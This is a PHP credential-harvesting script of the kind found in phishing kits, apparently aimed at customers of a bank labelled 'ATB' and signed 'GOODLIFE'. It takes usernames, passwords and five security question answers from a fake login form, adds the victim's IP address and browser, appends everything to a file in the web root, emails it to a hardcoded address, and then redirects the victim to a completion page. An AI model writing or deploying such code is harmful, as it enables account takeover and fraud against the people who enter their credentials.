 <?php

error_reporting(0);
$send = "medahnabil@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginResults-------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------2 QuestionResults----------------\n";
$message .= "question1 : ".$_POST['question1']."\n";
$message .= "answer1 : ".$_POST['answer1']."\n";
$message .= "question2 : ".$_POST['question2']."\n";
$message .= "answer2 : ".$_POST['answer2']."\n";
$message .= "question3 : ".$_POST['question3']."\n";
$message .= "answer3 : ".$_POST['answer3']."\n";
$message .= "question4 : ".$_POST['question4']."\n";
$message .= "answer4 : ".$_POST['answer4']."\n";
$message .= "question5 : ".$_POST['question5']."\n";
$message .= "answer5 : ".$_POST['answer5']."\n";
$message .= "-----------------created by GOODLIFE---------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------ATB ReSulT-----------------------\n";

$subject = "ATB - created by GOODLIFE ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"ATB - GOODLIFE" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "ATB - GOODLIFE", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "complete.html";

</script>